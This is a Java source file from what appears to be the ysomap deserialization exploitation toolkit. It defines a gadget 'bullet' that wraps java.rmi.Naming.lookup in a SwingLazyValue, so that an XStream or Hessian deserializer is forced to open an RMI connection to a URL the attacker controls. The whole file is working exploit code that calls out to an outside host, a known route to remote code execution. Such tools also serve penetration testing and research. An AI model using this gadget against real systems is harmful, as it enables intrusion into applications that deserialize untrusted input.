package ysomap.bullets.jdk;

import sun.swing.SwingLazyValue;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Bullets
@Dependencies({"jdk"})
@Details("向外部发起RMI连接")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class SwingLazyValueWithRMIBullet implements Bullet<SwingLazyValue> {

    @NotNull
    @Require(name = "rmiURL", detail = "like rmi://xxx/xx")
    public String rmiURL;

    @Override
    public SwingLazyValue getObject() throws Exception {
        String classname = "java.rmi.Naming";
        String methodName = "lookup";
        Object[] evilargs = new Object[]{rmiURL};
        return new SwingLazyValue(classname, methodName, evilargs);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new SwingLazyValueWithRMIBullet();
        bullet.set("rmiURL", args[0]);
        return bullet;
    }
}
